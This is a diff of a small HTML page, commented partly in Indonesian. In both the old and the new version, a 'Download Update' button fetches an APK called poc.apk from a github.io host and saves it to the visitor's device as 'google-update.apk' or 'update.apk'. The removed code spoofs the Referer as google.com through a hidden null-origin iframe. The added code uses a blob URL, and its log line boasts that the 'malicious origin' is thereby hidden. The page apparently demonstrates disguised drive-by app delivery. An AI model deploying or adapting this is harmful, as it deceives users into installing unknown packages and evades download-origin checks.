@@ -3,72 +3,37 @@
 <head>
   <meta charset="utf-8">
   <style>
-    .btn {
-      background:#4CAF50; color:white; padding:15px 32px; font-size:16px;
-      border:none; cursor:pointer; border-radius:8px; margin:20px;
-    }
+    .btn { background:#4CAF50; color:white; padding:15px 32px; font-size:16px; border:none; cursor:pointer; border-radius:8px; }
   </style>
 </head>
 <body>
   <center>
-    <h2>Download APK (Origin & Referer Spoofed)</h2>
-    <button class="btn" onclick="startDownload()">Download Update</button>
-    <div id="status">Status: Ready</div>
+    <button class="btn" onclick="download()">Download Update</button>
   </center>
 
   <script>
-  function startDownload() {
-    document.getElementById('status').textContent = 'Status: Memulai...';
-
-    // 1. Buat iframe dengan origin null (data: URL)
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'data:text/html,' + encodeURIComponent(`
-      <!DOCTYPE html>
-      <script>
-        // Kita sekarang berada di origin null → boleh spoof Referer!
-        async function doFetch() {
-          try {
-            const resp = await fetch('https://aliothme.github.io/poc.apk', {
-              referrer: 'https://www.google.com/',           // Paksa Referer header
-              referrerPolicy: 'unsafe-url',                  // Wajib untuk override
-              mode: 'cors',
-              credentials: 'omit'
-            });
-
-            const blob = await resp.blob();
-            const url = URL.createObjectURL(blob);
-
-            // Kirim blob URL kembali ke parent
-            parent.postMessage({ type: 'DOWNLOAD', url: url }, '*');
-          } catch(e) {
-            parent.postMessage({ type: 'ERROR', msg: e.message }, '*');
-          }
-        }
-        doFetch();
-      </script>
-    `);
-    document.body.appendChild(iframe);
-
-    // 2. Terima blob dari iframe dan trigger download
-    window.addEventListener('message', function handler(e) {
-      if (e.data.type === 'DOWNLOAD') {
-        const a = document.createElement('a');
-        a.href = e.data.url;
-        a.download = 'google-update.apk';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(e.data.url);
-
-        document.getElementById('status').textContent = 'Status: Download selesai! Cek Network → Referer = google.com';
-        window.removeEventListener('message', handler);
-        iframe.remove();
-      }
-      if (e.data.type === 'ERROR') {
-        document.getElementById('status').textContent = 'Status: Error - ' + e.data.msg;
-      }
-    });
+  async function download() {
+    try {
+      const resp = await fetch('https://aliothme.github.io/poc.apk');
+      if (!resp.ok) throw new Error('Fetch failed');
+      
+      const blob = new Blob([await resp.blob()], {
+        type: 'application/vnd.android.package-archive'
+      });
+      
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'update.apk';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      
+      console.log('Success – origin malicious berhasil dihilangkan (blob URL)');
+    } catch(e) {
+      console.error(e);
+    }
   }
   </script>
 </body>
